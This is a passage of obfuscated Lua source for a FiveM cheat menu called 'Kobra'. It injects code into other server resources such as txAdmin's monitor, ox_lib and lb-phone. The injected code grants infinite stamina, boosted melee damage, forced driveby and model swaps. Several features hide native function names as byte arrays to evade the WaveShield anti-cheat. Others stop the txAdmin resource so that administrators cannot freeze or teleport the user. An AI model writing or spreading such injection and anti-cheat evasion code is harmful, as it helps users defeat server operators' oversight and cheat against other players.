                                        ]]);v12:Notify("error","Kobra","Anti-Freeze Disabled (Fallback)",3000);break;end end end end},{type="checkbox",label="Force Third Person",checked=false,desc="This will force third person.",onSelect=function(v387) if v387 then v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                                kJfGhTrEeWqAsDz = true

                                local function pqkTRWZ38y()
                                    local gKdNqLpYxMiV = CreateThread
                                    gKdNqLpYxMiV(function()
                                        while kJfGhTrEeWqAsDz and not Unloaded do
                                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                            qWeRtYuIoPlMnBv(0)
                                            aSdFgHjKlQwErTy(0)
                                            Wait(0)
                                        end
                                    end)
                                end

                                pqkTRWZ38y()
                                ]]);else v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                kJfGhTrEeWqAsDz = false
                                ]]);end end},{type="checkbox",label="Force Driveby",checked=false,desc="This will enable driveby if disabled.",onSelect=function(v388) if v388 then v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                                zXcVbNmQwErTyUi = true

                                local function UEvLBcXqM6()
                                    local cVbNmAsDfGhJkLz = CreateThread
                                    cVbNmAsDfGhJkLz(function()
                                        while zXcVbNmQwErTyUi and not Unloaded do
                                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                            local eRtYuIoPaSdFgHi = PlayerPedId()

                                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                            Wait(0)
                                        end
                                    end)
                                end

                                UEvLBcXqM6()
                                ]]);else v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                zXcVbNmQwErTyUi = false
                                ]]);end end},{type="checkbox",label="Infinite Stamina",checked=false,desc="This will enable Infinite Stamina.",onSelect=function(v389) if v389 then local v614=0 + 0 ;while true do if ((0 + 0)==v614) then v12:Notify("success","Kobra","Infinite Stamina On",8593 -5593 );if (GetResourceState("WaveShield")=="started") then v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.infiniteStaminaEnabled then
                                                _G.infiniteStaminaEnabled = true

                                                local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                                local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                                local Wait_fn             = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[InfiniteStamina] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.infiniteStaminaEnabled do
                                                        local pid = GetPlayerId_fn()
                                                        if pid then
                                                            RestoreStamina_fn(pid, 1.0)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                            if _G.infiniteStaminaEnabled == nil then
                                                _G.infiniteStaminaEnabled = true

                                                local function ThreadStart()
                                                    local CreateThread_fn = CreateThread
                                                    local Wait_fn         = Wait
                                                    local PlayerId_fn     = PlayerId
                                                    local Restore_fn      = RestorePlayerStamina

                                                    CreateThread_fn(function()
                                                        while true do
                                                            Wait_fn(0)
                                                            if not _G.infiniteStaminaEnabled then
                                                                Wait_fn(500)
                                                                goto continue
                                                            end

                                                            local pid = PlayerId_fn()
                                                            if pid then
                                                                Restore_fn(pid, 1.0)
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                ThreadStart()
                                            end
                                            _G.infiniteStaminaEnabled = true
                                        ]]);end break;end end else v12:Notify("error","Kobra","Infinite Stamina Off",381 + 2619 );if (GetResourceState("WaveShield")=="started") then v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);end end end},{type="checkbox",label="Tiny Ped",checked=false,desc="This will turn you into a tiny ped.",onSelect=function(v390) local v391=0 -0 ;local v392;while true do if (v391==(591 -(562 + 29))) then v392=((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v390 then v49(v392,[[
                                        if not _G.KobraTinyPedInjected then
                                            _G.KobraTinyPedInjected = true
                                            _G.KobraTinyPedEnabled = true

                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...)
                                                    return newFunction(originalNative, ...)
                                                end
                                            end

                                            hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                            -- One-shot initflow (no looping)
                                            function initflow(name, fn)
                                                if not _G.__flows then _G.__flows = {} end
                                                if _G.__flows[name] then
                                                    _G.__flows[name].active = false
                                                end
                                                local flow = { active = true }
                                                _G.__flows[name] = flow

                                                SetTimeout(0, function()
                                                    if flow.active then
                                                        fn()
                                                    end
                                                end)
                                            end
                                        else
                                            _G.KobraTinyPedEnabled = true
                                        end

                                        initflow("TinyPedOnce", function()
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetPedConfigFlag(ped, 223, true)
                                            end
                                        end)
                                    ]]);else v49(v392,[[
                                        _G.KobraTinyPedEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, false)
                                        end
                                    ]]);end break;end end end},{type="checkbox",label="Super Punch",checked=false,onSelect=function(v393) local v394=GetResourceState("WaveShield")=="started" ;local v395=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v393 then if v394 then v12:Notify("success","Kobra","Super Punch Enabled",2558 + 442 );v49(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicleMod = SetPlayerVehicleDamageModifier
                                                local setWeaponMod = SetWeaponDamageModifier
                                                local playerId = PlayerId
                                                local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    Wait(0)
                                                    local pid = playerId()
                                                    setMeleeMod(pid, damageValue)
                                                    setVehicleMod(pid, damageValue)
                                                    setWeaponMod(unarmedHash, damageValue)
                                                end

                                                -- Restore on disable
                                                local pid = playerId()
                                                setMeleeMod(pid, 1.0)
                                                setVehicleMod(pid, 1.0)
                                                setWeaponMod(unarmedHash, 1.0)
                                            end)
                                        ]]);else local v784=1419 -(374 + 1045) ;while true do if (v784==(0 + 0)) then v49(v395,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function startSuperPunch()
                                                local create = CreateThread
                                                local wait = Wait
                                                local setMelee = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicle = SetPlayerVehicleDamageModifier
                                                local setWeapon = SetWeaponDamageModifier
                                                local getPlayer = PlayerId
                                                local hashKey = GetHashKey

                                                create(function()
                                                    local unarmedHash = hashKey("WEAPON_UNARMED")
                                                    local damageValue = 150.0

                                                    while superPunchEnabled and not Unloaded do
                                                        local pid = getPlayer()
                                                        setMelee(pid, damageValue)
                                                        setVehicle(pid, damageValue)
                                                        setWeapon(unarmedHash, damageValue)
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local pid = getPlayer()
                                                    setMelee(pid, 1.0)
                                                    setVehicle(pid, 1.0)
                                                    setWeapon(unarmedHash, 1.0)
                                                end)
                                            end

                                            startSuperPunch()
                                        ]]);v12:Notify("success","Kobra","Super Punch Enabled (Fallback)",9315 -6315 );break;end end end elseif v394 then v12:Notify("error","Kobra","Super Punch Disabled",3638 -(448 + 190) );v49(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            superPunchEnabled = false
                                        ]]);else v49(v395,[[
                                            superPunchEnabled = false
                                        ]]);v12:Notify("error","Kobra","Super Punch Disabled (Fallback)",3000);end end},{type="divider",label="txAdmin Options"},{type="checkbox",label="txAdmin Player IDs",checked=false,desc="This will toggle txAdmin Player ids.",onSelect=function(v396) if v396 then MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(true, true)
                                ]]);else MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(false, true)
                                ]]);end end},{type="checkbox",label="txAdmin Noclip",checked=false,desc="This will toggle txAdmin noclip.",onSelect=function(v397) if v397 then if (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","noclip",true);else MachoInjectResource2(11 -8 ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(true, true)
                                        ]]);end elseif (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","none",true);else MachoInjectResource2(8 -5 ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(false, true)
                                        ]]);end end},{type="checkbox",label="Disable All txAdmin",checked=false,desc="This will disable txAdmin options from admins using them against you.",onSelect=function(v398) if v398 then local v615=0 -0 ;while true do if (v615==(0 -0)) then MachoResourceStop("monitor");print("started");break;end end else local v616=0 -0 ;while true do if (v616==(683 -(232 + 451))) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Teleport",checked=false,desc="This will disable txAdmin Teleport.",onSelect=function(v399) if v399 then local v617=0;while true do if (v617==(0 + 0)) then MachoResourceStop("monitor");print("started");break;end end else local v618=564 -(510 + 54) ;while true do if (v618==(0 -0)) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Freeze",checked=false,desc="This will disable txAdmin Freeze.",onSelect=function(v400) if v400 then local v619=0 -0 ;while true do if (v619==(0 -0)) then MachoResourceStop("monitor");print("started");break;end end else print("stopped");MachoResourceStart("monitor");end end}}},{label="Wardrobe",tabs={{icon="",type="scrollable",value=1 -0 ,values={"Random"},label="Outfit",desc="Apply a preset outfit",onSelect=function(v401) if (v401=="Random") then v49("any",[[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]]);end end},{type="divider",label="Ped Options"},{type="scrollable",label="Freemode",scrollType="onEnter",value=1 + 0 ,values={"Freemode Male","Freemode Female"},onSelect=function(v402) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v402));end},{type="scrollable",label="Peds",scrollType="onEnter",value=1 + 0 ,values={"Michael","Franklin","Trevor","Lamar","Jimmy","Amanda","Tracey","Ron","Wade","Dave Norton","Steve Haines","Devin Weston","Floyd","Chef","Lester","Chop","Brad","Police Officer Male","Police Officer Female","SWAT","Sheriff Male","Sheriff Female","Highway Cop","FIB Male","FIB Female","Paramedic","Firefighter","Doctor","Construction Worker","Pilot Male","Pilot Female","Business Male","Business Female","Street Dealer","Gang Male 1","Gang Male 2","Gang Female 1","Ballas 1","Ballas 2","Ballas Female","Families 1","Families 2","Vagos 1","Vagos 2","Lost MC 1","Lost MC 2","Lost MC Female","Army Soldier","Marine 1","Marine 2","Prisoner Male","Prison Guard","Cop Undercover","Security Guard","Janitor","Hobo Male","Hobo Female","Prostitute 1","Prostitute 2","Beach Male","Beach Female","Tourist Male","Tourist Female","Skater","Hipster Male","Hipster Female","Bouncer","Shopkeeper","Chef","Bartender","Waiter","Mechanic","Taxi Driver","Gardener","Farmer","Dock Worker","Trash Worker","Postal Worker","Bus Driver","Pilot","Air Hostess","Cop Traffic","Cop Detective","Agent","Reporter","News Cameraman","Hunter","Hiker Male","Hiker Female","Golfer Male","Golfer Female","Tennis Player Male","Tennis Player Female"},onSelect=function(v403) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v403));end},{type="scrollable",label="Animal Peds",scrollType="onEnter",value=130 -(118 + 11) ,values={"Boar","Cat","Chicken","Chimp","Cow","Coyote","Crow","Deer","Dolphin","Fish","Hen","Humpback","Husky","Killer Whale","Mountain Lion","Pig","Pigeon","Poodle","Pug","Poodle","Rabbit","Rat","Retriever","Rhesus Monkey","Rottweiler","Seagull","Shepherd","Stingray","Tiger Shark","Hammerhead Shark","Cow","Cat2","Chickenhawk","Cormorant","Coyote2","Chimp2","Boar2","Deer2","Fish2","Husky2","Pug2","Poodle2","Retriever2","Shepherd2","Rat2","Rabbit2","Dolphin2","Killer Whale2","Mountain Lion2","Pig2","Seagull2","Stingray2","Tiger Shark2","Hammerhead Shark2"},onSelect=function(v404) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
